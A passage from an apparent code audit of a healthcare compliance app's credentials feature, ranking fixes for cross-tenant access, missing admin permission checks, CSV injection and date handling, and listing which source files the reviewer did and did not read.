1. **C-1 (cross-tenant guard on all 5 credential projections)** — ~50 LOC across `credential.ts`. Mirrors the `sraDraftSaved.ts:52` guard; protects against future code paths bypassing action-layer validation. **Highest-impact-per-LOC fix in the entire credentials surface.**
2. **C-2 (OWNER/ADMIN gates on `addCredentialAction` + `removeCredentialAction`)** — ~10 LOC across two action functions; matches the pattern already in 4 of the 6 actions in the same file. Closes the privilege-escalation primitive on framework score manipulation.
3. **C-4 + I-4 (CSV injection prevention, both export and import paths)** — ~15 LOC of `csvEscape` hardening + matching `sanitizeCell` on import. Defense-in-depth pattern; also benefits vendor + tech-asset bulk paths since `BulkCsvImport` is shared.
4. **I-5 + I-11 (consolidate the 4-state derivation + 90-day boundary into `src/lib/credentials/status.ts`)** — ~30 LOC extraction; eliminates 5 duplicate code paths and 2 different boundary windows. Single source of truth that the badge, page, Concierge, PDF, and notification generator can all import.
5. **I-1 + (HIPAA I-1 + OSHA I-1/I-4 — combined architectural fix)** — `practice.timezone` field + `formatPracticeDate(date, tz)` helper. One Prisma migration + one shared helper unblocks audit-PDF date correctness across HIPAA, OSHA, and credentials surfaces.

## Sampling caveats

- All 8 files in `src/app/(dashboard)/programs/credentials/` read fully (page, AddCredentialForm, CredentialActions, CredentialStatusBadge, [id]/page, [id]/CredentialDetail, bulk-import/page, bulk-import/CredentialBulkImport).
- All credential server actions in `actions.ts` (470 LOC) read fully.
- `src/lib/events/projections/credential.ts` read fully; cross-checked against `sraDraftSaved.ts` (the reference for HIPAA C-1) to confirm the guard pattern.
- `src/lib/audit/credentials-register-pdf.tsx` + the calling route (`api/audit/credentials-register/route.tsx`) read fully.
- `src/lib/compliance/derivation/shared.ts` (the `credentialTypePresentRule` factory) read fully; cross-framework wiring (DEA / CLIA / CMS) only sampled via grep — no body reads of `dea.ts` / `clia.ts` / `cms.ts`.
- `src/lib/notifications/generators.ts`: read lines 1-220 (SRA + credential-expiring + credential-renewal), 740-820 (CMS enrollment), 1100-1230 (credential escalation), 1240-1290 (aggregator). Lines 220-740 + 820-1100 NOT read in detail.
- `src/lib/ai/conciergeTools.ts`: only the `list_credentials` handler read in detail.
- `BulkCsvImport` shared component + `parseCsv` helpers read fully.
- 3 of 5 integration tests read fully (`credential-projection`, `credential-ceu-projection`, `credential-ceu-action`, `credential-renewal-reminders`); `training-completion.test.ts` not opened (cross-cutting).
- A11y: visual JSX inspect only; no axe/VoiceOver run.
- `_v1-credential-types-export.json` content not opened — the 52 codes' actual values are unverified against `dea.ts` / `clia.ts` / `cms.ts` references.
